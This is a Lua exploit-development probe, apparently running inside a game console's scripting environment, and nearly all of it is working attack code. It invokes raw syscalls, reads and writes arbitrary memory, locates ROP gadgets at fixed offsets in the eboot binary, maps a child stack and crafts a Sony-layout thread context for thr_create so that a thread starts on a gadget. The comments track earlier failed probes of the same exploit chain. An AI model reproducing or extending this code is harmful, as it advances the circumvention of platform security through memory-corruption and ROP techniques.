-- CRASH_CLASS: LOW
-- PROBE 531n: thr_create diagnostic — reproduce 156d EXACTLY
--
-- 531m died. Possible causes:
-- 1. GPU mmap (0x33) pages invalid for child RSP
-- 2. jmp_self gadget wrong (eboot+0x1481 may not be EB FE)
-- 3. Some other context field
--
-- 156d used memory.alloc() for stack. Let's match that.
-- Also verify gadget bytes before using them.

print("=== PROBE 531n: THR DIAG ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local ebn = eb_hi * 0x100000000 + eb_lo
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=%s", hexq(eb)))

-- [A] Verify gadget bytes
print("[A] Gadgets")
local mov_off = 0x92C67
local b0 = rd(ebn + mov_off)
local b1 = rd(ebn + mov_off + 2)
if b0 then
    local lo = b0
    if lo < 0 then lo = lo + 0x100000000 end
    print(string.format("  mov[rdi],rax;ret @ +0x%X: 0x%08X", mov_off, lo))
    -- Should be: 48 89 07 C3 = 0xC3078948
end

-- Search for a real jmp_self (EB FE) in first 0x2000
local jmp_off = nil
for off = 0, 0x2000, 2 do
    local d = rd(ebn + off)
    if d then
        local dn = d
        if dn < 0 then dn = dn + 0x100000000 end
        -- Look for EB FE xx xx pattern
        if (dn % 0x10000) == 0xFEEB then
            jmp_off = off
            print(string.format("  jmp$ @ +0x%X: 0x%08X", off, dn))
            break
        end
    end
end
if not jmp_off then
    -- Also check: F4 = hlt (privileged, will SIGILL), CC = int3
    -- Better: use a bare_ret gadget (+0x42) and just let thread terminate
    print("  no jmp$ found in first 0x2000")
    -- Use 0xEBFE search at wider range or just use spin loop in RW page
end

-- [B] Use memory.alloc for stack (matching 156d approach)
print("[B] Setup")
local shared = memory.alloc(0x1000)
wq(N(shared), uint64(0))

-- Stack: 2MB from mmap (like CHAIN_14_10.md uses)
local sc_477 = mk(477)
local stack_sz = 0x200000
local child_stack = sc_477(uint64(0), uint64(stack_sz), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local csn = N(child_stack)
print(string.format("  stack=0x%X prot=RW(3)", csn))

local rsp_val = csn + stack_sz - 0x100
-- After mov[rdi],rax;ret, the child pops [rsp] as next RIP.
-- Put a spin loop there: write EB FE (jmp $) into the stack page
-- and point return to it. Stack is RW not RX, so this WON'T work
-- for execution! We need the gadget in eboot.

-- Alternative: use bare_ret as "parking" — child loops doing ret forever
-- at rsp, each ret pops next qword. Fill rsp area with bare_ret.
local bare_ret = eb + uint64(0x42)
for off = 0, 0xF8, 8 do
    wq(rsp_val + off, bare_ret)
end
-- Eventually child hits unmapped memory and dies, but we have time to read marker

-- mov [rdi], rax; ret
local mov_rdi_rax_ret = eb + uint64(mov_off)

-- [C] Build context
print("[C] Context")
local ctx = memory.alloc(0x500)
for off = 0, 0x4BF, 8 do wq(N(ctx) + off, uint64(0)) end

-- Gates (EXACT 156c/156d values)
wd(N(ctx) + 0x108, 0x480)
wd(N(ctx) + 0x0D0, 0)      -- flags=0 (NOT 4!)
wd(N(ctx) + 0x110, 0x10000)

-- Segments
wd(N(ctx) + 0x0C0, 0x43)
wd(N(ctx) + 0x100, 0x3B)

-- RFLAGS
wq(N(ctx) + 0x0F0, uint64(0x202))

-- RIP = mov [rdi], rax; ret
wq(N(ctx) + 0x0E0, mov_rdi_rax_ret)
-- RSP
wq(N(ctx) + 0x0F8, uint64(rsp_val))

-- GPRs (Sony layout):
-- +0x048 = RDI
wq(N(ctx) + 0x048, uint64(N(shared)))
-- +0x078 = RAX
wq(N(ctx) + 0x078, uint64("0xDEADBEEFCAFE"))

print(string.format("  rip=%s rdi=0x%X rax=0xDEADBEEFCAFE", hexq(mov_rdi_rax_ret), N(shared)))
print(string.format("  rsp=0x%X flags=0 gates=480/0/10000", rsp_val))

-- [D] thr_create
print("[D] thr_create")
local tid_out = memory.alloc(8)
wq(N(tid_out), uint64(0))
local ok_tc, rv_tc = pcall(function()
    return mk(430)(uint64(N(ctx)), uint64(N(tid_out)), uint64(0))
end)
local rv_n = -999
if ok_tc and rv_tc then rv_n = N(rv_tc) end
print(string.format("  ok=%s rv=%d (%s)", tostring(ok_tc), rv_n, hexq(rv_tc)))
print(string.format("  tid=%s", hexq(rq(N(tid_out)))))

if rv_n ~= 0 then
    print("  CONTEXT REJECTED — check gates/segments/rip")
    -- Dump context for debugging
    for _, off in ipairs({0x0D0, 0x0E0, 0x0F0, 0x0F8, 0x100, 0x108, 0x110, 0x0C0}) do
        print(string.format("  ctx+0x%03X = %s", off, hexq(rq(N(ctx) + off))))
    end
end

-- [E] Wait + check
print("[E] Check")
local dummy = 0
for i = 1, 2000000 do dummy = dummy + 1 end

local result = rq(N(shared))
print(string.format("  marker=%s", hexq(result)))

local rn = N(result)
if rn ~= 0 then
    print("  SUCCESS: child wrote to shared!")
else
    print("  FAILED: marker not written")
    -- Check if thr_kill works
    local tid = rq(N(tid_out))
    if tid and N(tid) ~= 0 then
        local ok_k, rv_k = pcall(function()
            return mk(433)(uint64(N(tid)), uint64(0))
        end)
        print(string.format("  thr_kill(0)=%s", ok_k and hexq(rv_k) or "FAIL"))
    end
end

print("")
print("=== 531n DONE ===")
